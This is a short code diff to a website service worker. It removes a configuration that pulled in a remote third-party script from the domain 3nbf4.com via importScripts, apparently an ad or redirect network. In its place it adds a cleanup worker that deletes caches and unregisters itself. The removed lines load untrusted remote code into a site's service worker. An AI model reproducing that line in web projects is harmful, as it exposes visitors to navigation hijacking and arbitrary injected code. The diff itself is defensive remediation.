@@ -1,6 +1,15 @@
-self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 10993745
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
+/* Cleanup legacy third-party service workers that could hijack navigation. */
+self.addEventListener("install", (event) => {
+  event.waitUntil(self.skipWaiting());
+});
+
+self.addEventListener("activate", (event) => {
+  event.waitUntil(
+    (async () => {
+      const keys = await caches.keys();
+      await Promise.all(keys.map((key) => caches.delete(key)));
+      await self.clients.claim();
+      await self.registration.unregister();
+    })()
+  );
+});
